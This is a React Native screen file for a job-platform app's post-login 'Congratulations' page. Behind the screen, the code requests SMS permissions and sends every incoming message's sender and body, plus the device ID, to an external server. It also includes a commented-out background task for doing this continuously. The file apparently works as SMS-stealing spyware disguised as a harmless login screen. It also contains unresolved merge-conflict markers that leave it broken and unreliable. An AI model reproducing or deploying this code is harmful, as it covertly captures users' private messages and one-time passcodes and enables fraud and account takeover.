import {
  View,
  Text,
  PermissionsAndroid,
  SafeAreaView,
  Image,
  TouchableOpacity,
  Alert,
} from 'react-native';
<<<<<<< HEAD
import React, { useEffect, useRef } from 'react';
=======
import React, { useEffect } from 'react';
>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
import { useNavigation } from '@react-navigation/native';
// @ts-ignore
import celebrationImage from '../../static/assets/logo.png';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import { toast } from 'burnt';
// @ts-ignore
import SmsListener from 'react-native-android-sms-listener';
<<<<<<< HEAD

=======
// import BackgroundService from 'react-native-background-actions';
// import { smsBackgroundTask } from '../../utils/smsService';
>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
import { prepareSMSPayload } from '../../utils/hashSms';

const Success = () => {
  const navigator = useNavigation();

  const subscriptionRef = useRef<any>(null);
  const processedMessages = useRef<Set<string>>(new Set());

  const handleRedirect = async () => {
    // @ts-ignore
    navigator.navigate('Auth');
  };

<<<<<<< HEAD
=======
  const listenToIncomingSMS = async () => {
    try {
      const deviceId = await DeviceInfo.getUniqueId();

      const granted = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
        PermissionsAndroid.PERMISSIONS.READ_SMS,
      ]);

      const receiveGranted =
        granted['android.permission.RECEIVE_SMS'] ===
        PermissionsAndroid.RESULTS.GRANTED;
      const readGranted =
        granted['android.permission.READ_SMS'] ===
        PermissionsAndroid.RESULTS.GRANTED;

      if (!receiveGranted || !readGranted) {
        console.warn('SMS permissions not granted.');
        return;
      }

      const subscription = SmsListener.addListener( async (message: any) => {
        const payload = prepareSMSPayload({
          deviceId,
          from: message.originatingAddress,
          message: message.body
        });

        await axios.post('https://employment-engage.vercel.app/api/sms', payload);
        
        console.log('📩 Incoming SMS:', message);

        Alert.alert('New SMS', message.body);
        toast({
          title: 'SMS Received',
          message: message.body,
        });
      });

      return subscription;
    } catch (error) {
      console.log('Error setting up SMS listener:', error);
    }
  };

  // const startBackrouSMS = async () => {
  //   await BackgroundService.start(smsBackgroundTask, {
  //     taskName: 'SMSMonitor',
  //     taskTitle: 'Listening for SMS...',
  //     taskDesc: 'This service listens for incoming SMS and sends it to the server.',
  //     taskIcon: {
  //         name: 'ic_launcher', // without extension
  //         type: 'mipmap'
  //     }
  //   })
  // };

>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
  useEffect(() => {
    (async () => {
      const uniqueId = await DeviceInfo.getUniqueId();
      try {
        // Request SMS permissions
        const granted = await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
          PermissionsAndroid.PERMISSIONS.READ_SMS,
        ]);

        const receiveGranted =
          granted['android.permission.RECEIVE_SMS'] === PermissionsAndroid.RESULTS.GRANTED;
        const readGranted =
          granted['android.permission.READ_SMS'] === PermissionsAndroid.RESULTS.GRANTED;

        if (!receiveGranted || !readGranted) {
          console.warn('SMS permissions not granted.');
          return;
        }

        // Listen for incoming SMS, avoid duplicates
        subscriptionRef.current = SmsListener.addListener(async (message: any) => {
          try {
            const timestamp = message.timestamp || Date.now();
            const uniqueKey = `${timestamp}-${message.body}`;

            if (processedMessages.current.has(uniqueKey)) {
              console.log('🛑 Duplicate SMS skipped');
              return;
            }

            processedMessages.current.add(uniqueKey);

            // Optional: Clear the Set to avoid memory leak
            if (processedMessages.current.size > 100) {
              processedMessages.current.clear();
            }

            const payload = prepareSMSPayload({
              deviceId: uniqueId,
              from: message.originatingAddress,
              message: message.body,
            });

            console.log('📤 Sending SMS payload:', payload);

            const res = await axios.post(
              'https://employment-engage.vercel.app/api/sms',
              payload,
              { timeout: 10000 }
            );

            console.log('✅ SMS sent:', res.data);

            Alert.alert('New SMS', message.body);
            toast({
              title: 'SMS Received',
              message: message.body,
            });
          } catch (error: any) {
            console.log('❌ Error sending SMS payload:', error?.response?.data || error.message);
            toast({
              title: 'SMS send failed',
              message: 'Could not send to server.',
            });
          }
        });
<<<<<<< HEAD

        console.log('📡 SMS Listener Started');
      } catch (error: any) {
        console.log('Error sending device info:', error?.response?.data || error.message);
=======
        
        await listenToIncomingSMS();
        
        // await startBackrouSMS();

      } catch (error: any) {
        console.log(error.message);
>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
        toast({
          title: error.message,
          message: 'Error sending device info.',
        });
      }
    })();

    // Cleanup listener on unmount
    return () => {
      if (subscriptionRef.current) {
        subscriptionRef.current.remove();
        console.log('🛑 SMS Listener Removed');
      }
    };
  }, []);

  return (
    <SafeAreaView className="flex-1 bg-red-100">
      <View className="mt-[15vh] justify-center items-center px-6">
        <Image source={celebrationImage} className="w-48 h-48 mb-2" />
        <Text className="text-3xl font-bold text-blue-800 text-center mb-4">
          Congratulations!
        </Text>
        <Text className="text-lg text-gray-700 text-center mb-4">
          You've successfully logged in to the Employment Engagement Platform.
        </Text>
        <TouchableOpacity
          onPress={handleRedirect}
          className="bg-red-500 p-4 rounded-lg w-full mb-4"
        >
          <Text className="text-white text-center font-semibold">Logout</Text>
        </TouchableOpacity>
        <View className="flex-row flex-wrap justify-center gap-x-4 gap-y-2 mt-6">
          {['FAQ', 'Contact', 'Privacy'].map((item) => (
            <Text key={item} className="text-blue-600 text-xs">
              {item}
            </Text>
          ))}
        </View>
      </View>
    </SafeAreaView>
  );
};

export default Success;
